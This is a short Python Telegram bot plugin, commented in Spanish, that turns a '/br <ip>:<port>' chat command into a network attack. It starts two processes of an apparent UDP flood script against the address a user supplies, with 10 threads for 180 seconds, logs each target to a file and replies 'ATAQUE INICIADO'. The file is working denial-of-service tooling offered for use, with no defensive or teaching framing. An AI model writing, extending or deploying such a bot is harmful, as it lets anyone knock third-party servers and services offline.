import subprocess
from pyrogram import Client, filters
from pyrogram.types import Message

# Cargamos la instancia de cliente desde main.py
from main import app

# Lista para almacenar IPs y puertos
ips_y_puertos = []

@app.on_message(filters.command("br", prefixes=[".", "!", "/", ",", "-", "$", "%", "#"]))
async def comando_br(_, m: Message):
    try:
        texto = m.text[len("/br "):]
        partes = texto.split(":")
        
        if len(partes) != 2:
            await m.reply_text("❌ Formato incorrecto. Usa: /br <ip>:<puerto>")
            return

        ip = partes[0]
        port = partes[1]

        # Validación del puerto: si no comienza con 1, se asigna uno aleatorio
        if not port.startswith("1"):
            from random import randint
            port = str(randint(10015, 19999))

        direccion = f"{ip}:{port}"
        hilos = 10
        tiempo = 180

        # Agregar IP y puerto a la lista
        ips_y_puertos.append(direccion)

        # Ejecuta el comando
        for _ in range(2):
            args = ["python3", "start.py", "UDP", direccion, str(hilos), str(tiempo)]
            subprocess.Popen(args)

        # Guarda la dirección en un archivo
        with open("ipsandports.txt", "a") as file:
            file.write(f"{direccion}\n")

        # Respuesta del bot
        await m.reply_text(
            f"""<b>🔰 ATAQUE INICIADO 🔰
🌐 Dirección IP: {ip}
🔢 Puerto: {port}
🧭 Duración: {tiempo} segundos
🧟 Threads: {hilos}</b>"""
        )

    except Exception as e:
        await m.reply_text(f"❌ Error al iniciar el ataque: {e}")

# Ejecutar el bot
if __name__ == "__main__":
    app.run()